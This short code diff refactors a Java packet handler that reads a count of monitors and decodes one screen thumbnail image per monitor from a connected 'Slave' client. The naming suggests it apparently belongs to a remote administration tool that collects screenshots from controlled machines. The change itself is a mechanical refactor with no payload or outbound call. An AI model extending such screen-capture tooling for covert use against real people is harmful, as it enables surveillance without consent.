@@ -18,15 +18,15 @@ import java.util.List;
 public class PacketReceiveAllThumbnails extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
-		int monitors = dis.readInt();
+	public void read(Slave slave) throws Exception {
+		int monitors = slave.readInt();
 		
 		for (int i = 0; i < monitors; i++) {
-			int len = dis.readInt();
+			int len = slave.readInt();
 			
 			byte[] buffer = new byte[len];
 
-			dis.readFully(buffer);
+            slave.readFully(buffer);
 			
 			BufferedImage image = ImageUtils.decodeImage(buffer);
 			
